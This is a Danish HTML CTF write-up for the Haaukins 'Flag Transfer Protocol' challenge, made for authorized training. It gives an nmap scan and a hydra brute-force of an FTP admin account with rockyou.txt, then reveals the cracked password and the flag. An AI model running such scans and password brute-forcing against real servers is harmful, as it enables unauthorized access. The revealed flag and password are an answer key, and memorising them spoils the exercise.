@@ -1,0 +1,34 @@
+<!doctype html>
+<html lang="da">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Haaukins: Flag Transfer Protocol — tutorial</title>
+<meta name="description" content="Guide til Haaukins Flag Transfer Protocol: find FTP-serveren og brute-force admin-passwordet med hydra mod rockyou.">
+<link rel="stylesheet" href="assets/style.css">
+</head>
+<body>
+<div class="wrap">
+<nav class="topnav"><a href="index.html">← Alle Haaukins-tutorials</a></nav>
+<h1>Flag Transfer Protocol</h1>
+<p class="subtitle">Find FTP-serveren og brute-force admin med hydra.</p>
+<div class="badges"><span class="badge cat">Network</span><span class="badge">Haaukins CTF</span></div>
+<div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
+
+<h2>Trin for trin</h2>
+<pre><code>nmap -p21 --open &lt;subnet&gt;/24          # find FTP-host (pyftpdlib)
+hydra -l admin -P rockyou.txt -t 4 -f ftp://&lt;ip&gt;   # -> admin:phantom (tidligt i rockyou)
+# log ind, hent /flag.txt (jpg/png er pynt)</code></pre>
+             <p>Ved brute-force: slå aldrig et allerede-prøvet søgerum op igen — genoptag eller slice ordlisten.</p>
+<details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
+<p>Flag: <span class="flag">DDC{Keeping-track-of-all-my-flags}</span></p>
+</details>
+<h2>Hvad du har lært</h2>
+<ul><li>pyftpdlib tåler <code>hydra -t 4</code>; svage passwords ligger tidligt i rockyou.</li></ul>
+<footer>
+Del af <a href="index.html">Haaukins CTF-tutorials</a>. Materialet er løsningsstøtte til en autoriseret
+trænings-/CTF-kontekst — brug det til at lære, ikke til at springe læringen over.
+</footer>
+</div>
+</body>
+</html>
